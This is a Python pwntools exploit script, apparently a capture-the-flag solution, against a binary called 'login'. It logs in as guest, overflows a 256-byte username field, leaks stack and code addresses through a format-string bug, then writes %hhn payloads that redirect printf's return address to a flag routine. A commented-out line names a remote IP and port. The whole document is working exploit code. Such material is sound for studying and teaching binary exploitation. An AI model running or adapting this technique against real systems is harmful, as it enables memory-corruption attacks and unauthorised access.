#!/usr/bin/python

from pwn import *
from pwnlib.log import *
import sys

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
elf = ELF("login")
libc = ELF("libc.so.6")

r = remote("localhost", 55666)
#r = remote("202.112.28.116" 10910)

# level1
r.recvuntil("Login: ")
r.sendline("guest")
r.recvuntil("Password: ")
r.sendline("guest123")

r.recvuntil("Your choice: ")
r.sendline("2")
r.recvuntil("username:\n")
r.send("a"*256)
r.recvuntil("Your choice: ")
r.sendline("4")

# level2
# leak text & stack
r.recvuntil("Login: ")
check = "12345678"
r.sendline(check + "%23$lx%22$lx")
r.recvuntil("Password: ")
r.sendline("gg")
buf = r.recvuntil("login failed.\n")[8:32]
print buf
rsp = int(buf[:12], 16) - 800
info("rsp = " + hex(rsp))
base = int(buf[12:], 16) - 0xba0
info("base = " + hex(base))
printf_ret = rsp - 8
info("printf_ret = " + hex(printf_ret))
flag = base + 0xfb3
info("flag = " + hex(flag))

count = 0
def gen_fmt(byte, offset):
	global count
	while byte < count:
		byte += 0x100
	num = byte - count 
	count += num
#	return "%{0}c%{1}$lx".format(num, offset)
	return "%{0}c%{1}$hhn".format(num, offset)

payload =  gen_fmt(flag & 0xff, 15)
payload += gen_fmt((flag >> 8) & 0xff, 16)

print payload

# overwrite 
r.recvuntil("Login: ")
#payload = "%179c%15$hhn" + "%156c%16$hhn"
while len(payload) < 56:
	payload += "a"
payload += p64(printf_ret) + p64(printf_ret+1)
r.sendline(payload)
r.recvuntil("Password: ")
r.sendline("gg")

r.interactive()
